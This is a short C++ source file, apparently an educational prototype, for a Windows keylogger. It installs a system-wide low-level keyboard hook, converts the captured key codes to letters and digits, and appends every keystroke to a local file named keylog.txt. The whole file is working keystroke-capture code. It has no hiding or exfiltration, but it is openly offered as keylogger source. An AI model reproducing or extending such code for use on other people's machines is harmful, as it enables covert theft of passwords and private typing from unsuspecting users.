// simple key logger prototype demonstrating how keys are read and mapped to alphabetic and numeric symbols
//** WORK IN PROGRESS **

#include <iostream>
#include <fstream>
#include <Windows.h>

using namespace std;

HHOOK keyboardHook;
ofstream outputFile;

char MapVirtualKeyToChar(DWORD vkCode, bool shiftPressed) {
    
    if (vkCode >= 0x41 && vkCode <= 0x5A) {  // maps virtual key code to a-z and 0-9 
        if (shiftPressed) {
            return (char)vkCode;  
        }                               // if for lowercase else statement for upper
        else {
            return (char)(vkCode + 32);  
        }
    }
    else if (vkCode >= 0x30 && vkCode <= 0x39) {  
        return (char)vkCode;
    }

    return '\0';  
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;

        bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;

        char ch = MapVirtualKeyToChar(kbd->vkCode, shiftPressed);

        if (ch != '\0') {  
            outputFile << ch;
            cout << ch;  
        }
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

int main() {
    outputFile.open("keylog.txt", std::ios::app);
    if (!outputFile) {
        cerr << "Error opening file!" << endl;
        return 1;
    }

    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!keyboardHook) {
        cerr << "Error setting hook!" << endl;
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook);
    outputFile.close();
    return 0;
}